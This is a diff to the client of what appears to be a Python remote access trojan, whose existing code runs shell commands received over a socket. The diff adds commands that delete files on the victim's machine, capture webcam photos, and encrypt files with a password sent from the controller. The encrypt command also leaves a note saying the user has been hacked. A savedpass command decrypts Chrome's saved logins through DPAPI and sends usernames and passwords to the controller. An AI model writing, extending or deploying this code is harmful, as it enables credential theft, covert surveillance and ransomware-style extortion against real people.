@@ -9,11 +9,21 @@ from datetime import timezone, datetime, timedelta
 import pyaudio
 import wave
 import cv2
+from PIL import Image
 import shutil
 import sqlite3
 import sys
-import base64
 import platform
+import cryptography
+from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+import secrets
+import base64
+from io import BytesIO
+import json
+from win32 import win32crypt
+import contextlib
 
 def receive_commands():
     while True:
@@ -38,9 +48,21 @@ def receive_commands():
             filename = data[9:].decode('utf-8').strip()
             download_file(filename)
             receive_commands()
+        elif data[:].decode('utf-8').startswith('delete'):
+            filename = data[7:].decode('utf-8').strip()
+            delete(filename)
         elif data[:].decode('utf-8').startswith('upload'):
             filename = data[7:].decode('utf-8').strip()
             upload_file(filename)
+        elif data[:].decode('utf-8').startswith('encrypt'):
+            filename = data[8:].decode('utf-8').strip()
+            #password = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
+            encrypt_file(filename)
+            #download_file(f'{filename}.salt')
+        elif data[:].decode('utf-8').startswith('decrypt'):
+            filename = data[8:].decode('utf-8').strip()
+            #password = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
+            decrypt_file(filename)
         elif data[:].decode('utf-8').startswith('screenshot'):
             filename = data[11:].decode('utf-8').strip()
             screenshot(filename)
@@ -48,6 +70,12 @@ def receive_commands():
             filename = data[7:].decode('utf-8').strip()
             seconds = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
             recording(filename,seconds)
+        elif data[:].decode('utf-8').startswith('savedpass'):
+            filename = data[9:].decode('utf-8').strip()
+            savedpass(filename)
+        elif data[:].decode('utf-8').startswith('webcam'):
+            filename = data[7:].decode('utf-8').strip()
+            webcam(filename)
         elif len(data) > 0:
             try:
                 cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
@@ -62,6 +90,7 @@ def receive_commands():
                 print(output_str)
 
     s.close()
+
 
 
 def download_file(filename):
@@ -107,6 +136,21 @@ def upload_file(filename):
 
 
 
+def delete(filename):
+    try:
+        s.send(str.encode(filename))
+        response = s.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the client machine')
+        else:
+            try:
+                os.remove(filename)
+                print('Done Deleting')
+            except:
+                print('NotFound')
+    except Exception as e:
+        print('Error occurred while deleting the file:', str(e))
+
 def screenshot(filename):
     pic = pyautogui.screenshot()
     #filename = filename + '.png' 
@@ -134,6 +178,229 @@ def screenshot(filename):
             print('File not found on the local machine')
     except Exception as e:
         print('Error occurred while uploading the file:', str(e))
+
+def webcam(filename):
+    
+
+    # Create a VideoCapture object
+    cap = cv2.VideoCapture(0)
+
+    # Check if the webcam is opened correctly
+    if not cap.isOpened():
+        print("Cannot open webcam")
+        exit()
+
+    # Read a frame from the webcam
+    ret, frame = cap.read()
+
+    # If the frame is read correctly
+    if ret:
+        # Convert the frame to RGB format
+        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+        # Create a PIL Image from the frame
+        image = Image.fromarray(rgb_frame)
+
+        # Save the captured image to a file
+        image.save(f'{filename}.jpg')
+        print("Image captured!")
+
+    # Release the VideoCapture object
+    cap.release()
+
+
+
+    try:
+        
+        if os.path.exists(f'{filename}.jpg'):
+            s.send(b'Exists')
+            response = s.recv(1024).decode()
+            if response == 'FileExists':
+                print('File already exists on the remote server')
+            else:
+                with open(f'{filename}.jpg', 'rb') as file:
+                    while True:
+                        data = file.read(1024)
+                        if not data:
+                            break
+                        s.sendall(data)
+                time.sleep(0.5)
+                s.send(b'Done')
+                print('File uploaded successfully')
+                os.remove(f'{filename}.jpg')
+        else:
+            s.send(b'NotFound')
+            print('File not found on the local machine')
+    except Exception as e:
+        print('Error occurred while uploading the file:', str(e))
+
+
+
+
+
+def generate_salt(size=16):
+    """Generate the salt used for key derivation, 
+    `size` is the length of the salt to generate"""
+    return secrets.token_bytes(size)
+
+
+def derive_key(salt, password):
+    """Derive the key from the `password` using the passed `salt`"""
+    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
+    return kdf.derive(password.encode())
+
+
+def load_salt():
+    # load salt from salt.salt file
+    return open("salt.salt", "rb").read()
+
+
+def generate_key(password, load_existing_salt=False, save_salt=True):
+    """
+    Generates a key from a `password` and the salt.
+    If `load_existing_salt` is True, it'll load the salt from a file
+    in the current directory called "salt.salt".
+    If `save_salt` is True, then it will generate a new salt
+    and save it to "salt.salt"
+    """
+    if load_existing_salt:
+        # load existing salt
+        salt = load_salt()
+    elif save_salt:
+        # generate new salt and save it
+        salt = generate_salt()
+        with open("salt.salt", "wb") as salt_file:
+            salt_file.write(salt)
+    # generate the key from the salt and the password
+    derived_key = derive_key(salt, password)
+    # encode it using Base 64 and return it
+    return base64.urlsafe_b64encode(derived_key)
+
+
+def encrypt(filename, key):
+    """
+    Given a filename (str) and key (bytes), it encrypts the file and writes it
+    """
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+        # read all file data
+        file_data = file.read()
+    # encrypt data
+    encrypted_data = f.encrypt(file_data)
+    # write the encrypted file
+    with open(filename, "wb") as file:
+        file.write(encrypted_data)
+
+
+def decrypt(filename, key):
+    """
+    Given a filename (str) and key (bytes), it decrypts the file and writes it
+    """
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+        # read the encrypted data
+        encrypted_data = file.read()
+    # decrypt data
+    try:
+        decrypted_data = f.decrypt(encrypted_data)
+    except:
+        print("Invalid password. Decryption failed.")
+        return
+    # write the original file
+    with open(filename, "wb") as file:
+        file.write(decrypted_data)
+    print("File decrypted successfully")
+
+
+
+
+def encrypt_file(filename):
+    try:
+        s.send(str.encode(filename))
+        response = s.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            password = s.recv(1024).decode()
+            key =generate_key(password, load_existing_salt=False)
+            encrypt(filename,key)
+    except Exception as e:
+        print('Error occurred while encrypting the file:', str(e))
+
+    with open('salt.salt', "rb") as file:
+        # read all file data
+        file_data = file.read()
+    
+    
+    # write the encrypted file
+    with open(f'{filename}.salt', "wb") as file:
+        file.write(file_data)
+    os.remove('salt.salt')
+    
+    RIPPED = "WELL WELL, LOOKS LIKE YOU HAVE BEEN HACKED AND YOU NEED TO DO SOMETHING.\n" "YOUR FILE " f'{filename}' " HAS BEEN ENCRYPTED"
+    outfile = open(f'{filename}.txt', "w")
+    outfile.write(RIPPED)
+    outfile.close()
+    
+    try:
+        
+        if os.path.exists(f'{filename}.salt'):
+            s.send(b'Exists')
+            response = s.recv(1024).decode()
+            if response == 'FileExists':
+                print('File already exists on the remote server')
+            else:
+                with open(f'{filename}.salt', 'rb') as file:
+                    while True:
+                        data = file.read(1024)
+                        if not data:
+                            break
+                        s.sendall(data)
+                time.sleep(0.5)
+                s.send(b'Done')
+                print('File uploaded successfully')
+                os.remove(f'{filename}.salt')
+        else:
+            s.send(b'NotFound')
+            print('File not found on the local machine')
+    except Exception as e:
+        print('Error occurred while uploading the file:', str(e))
+
+def decrypt_file(filename):
+    # try:
+    #     s.send(str.encode(f'{filename}.salt'))
+    #     response = s.recv(1024).decode()
+    #     if response == 'FileNotFound':
+    #         print('File not found on the remote server')
+    #     else:
+
+    #         with open(f'{filename}.salt', 'wb') as file:
+    #             while True:
+    #                 data = s.recv(1024)
+    #                 if data == b'Done':
+    #                     print('File downloaded successfully')
+    #                     break
+                    
+    #                 file.write(data)
+    #         os.rename(f'{filename}.salt','salt.salt')
+
+
+    # except Exception as e:
+    #     print('Error occurred while downloading the file:', str(e))
+
+    try:
+        
+        s.send(str.encode(filename))
+        response = s.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            password = s.recv(1024).decode()
+            key = generate_key(password,load_existing_salt=True)
+            decrypt(filename,key)
+    except Exception as e:
+        print('Error occurred while decrypting the file:', str(e))
+
 
 
 def recording(filename,seconds):
@@ -189,6 +456,133 @@ def recording(filename,seconds):
             print('File not found on the local machine')
     except Exception as e:
         print('Error occurred while uploading the file:', str(e))
+
+
+
+
+
+def get_chrome_datetime(chromedate):
+    """Return a `datetime.datetime` object from a chrome format datetime
+    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    # decode the encryption key from Base64
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    # remove DPAPI str
+    key = key[5:]
+    # return decrypted key that was originally encrypted
+    # using a session key derived from current user's logon credentials
+    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_password(password, key):
+    try:
+        # get the initialization vector
+        iv = password[3:15]
+        password = password[15:]
+        # generate cipher
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # decrypt password
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
+
+
+def main_chrome():
+    # get the AES key
+    key = get_encryption_key()
+    # local sqlite Chrome database path
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "default", "Login Data")
+    # copy the file to another location
+    # as the database will be locked if chrome is currently running
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+    # connect to the database
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    # `logins` table has the data we need
+    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+    # iterate over all rows
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decrypt_password(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]        
+        if username or password:
+            print(f"Origin URL: {origin_url}")
+            print(f"Action URL: {action_url}")
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+        else:
+            continue
+        if date_created != 86400000000 and date_created:
+            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
+        if date_last_used != 86400000000 and date_last_used:
+            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+        print("="*50)
+    cursor.close()
+    db.close()
+    try:
+        # try to remove the copied db file
+        os.remove(filename)
+    except:
+        pass
+
+
+def savedpass(filename):
+    try:
+        username = os.environ.get("USERNAME")
+        with open("savedpass.txt",'w') as f:
+            with contextlib.redirect_stdout(f):
+                print(main_chrome())
+    except:
+        pass
+
+
+
+    try:
+        
+        if os.path.exists('savedpass.txt'):
+            s.send(b'Exists')
+            response = s.recv(1024).decode()
+            if response == 'FileExists':
+                print('File already exists on the remote server')
+            else:
+                s.send(str.encode(username))
+                with open('savedpass.txt', 'rb') as file:
+                    while True:
+                        data = file.read(1024)
+                        if not data:
+                            break
+                        s.sendall(data)
+                time.sleep(0.5)
+                s.send(b'Done')
+                print('File uploaded successfully')
+                os.remove('savedpass.txt')
+
+        else:
+            s.send(b'NotFound')
+            print('File not found on the local machine')
+    except Exception as e:
+        print('Error occurred while uploading the file:', str(e))
+
+
+
 
 
 def main():
